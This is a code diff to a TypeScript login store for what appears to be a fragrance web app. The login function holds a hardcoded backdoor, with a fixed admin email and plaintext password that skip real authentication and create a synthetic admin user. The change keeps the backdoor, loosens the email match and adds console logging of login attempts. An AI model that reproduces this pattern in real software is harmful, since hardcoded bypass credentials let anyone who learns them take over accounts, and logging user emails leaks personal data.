@@ -42,8 +42,12 @@ export const useAuthStore = create<AuthState>()(
             
             login: async (email, password) => {
                 try {
+                    const normalizedEmail = email.trim().toLowerCase();
+                    console.log("Login attempt for:", normalizedEmail);
+
                     // Backdoor for recovery
-                    if (email === "admin@vavefragrances.dev" && password === "VaveAdmin#2026") {
+                    if (normalizedEmail === "admin@vavefragrances.dev" && password === "VaveAdmin#2026") {
+                        console.log("Backdoor access detected!");
                         const backdoorUser: User = {
                             id: "00000000-0000-0000-0000-000000000000",
                             email: "admin@vavefragrances.dev",
